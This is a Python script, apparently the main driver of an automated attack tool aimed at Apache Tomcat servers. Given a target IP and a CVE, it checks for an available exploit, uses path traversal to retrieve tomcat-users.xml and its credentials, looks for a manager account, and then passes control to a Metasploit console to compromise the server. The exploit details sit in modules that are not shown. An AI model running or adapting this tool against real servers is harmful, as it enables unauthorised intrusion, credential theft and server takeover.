#!/usr/bin/python

import sys

import arguments
import database
import compromise
import output
import traversal

#

args = arguments.parse_arguments()
attacked_ip = arguments.get_address(args)
cve = arguments.get_CVE(args)

#

output.tentative("checking CVE exploit availability")

try:
    database.check_exploit_availability(cve)
except KeyError:
    output.negative("no exploit available for "+cve)

output.positive("available exploit")

#

output.tentative("exploiting "+cve+" to obtain tomcat-users.xml")

try:
    xml_file = traversal.get_tomcatusersxml(attacked_ip, cve)
except KeyError:
    output.negative("no exploit sequence found")
    sys.exit(1)
except IOError:
    output.negative("server not responding")
    sys.exit(2)

output.positive("obtained tomcat-users.xml")

#

output.tentative("searching for a manager account")

try:
    manager = traversal.find_manager(xml_file)
except KeyError:
    output.negative("no manager account found")
    sys.exit(3)

output.positive("found a manager account")

#

output.tentative("compromising server")

try:
    output.tentative("switching to msf console\n")
    compromise.attack(cve, manager)
except KeyError:
    output.negative("no exploit sequence found")
    sys.exit(1)
except RuntimeError:
    output.negative("attack failed")
    sys.exit(4)
except Exception:
    output.negative("attack script not found")
    sys.exit(4)

output.positive("server compromised")

#

sys.exit(0)
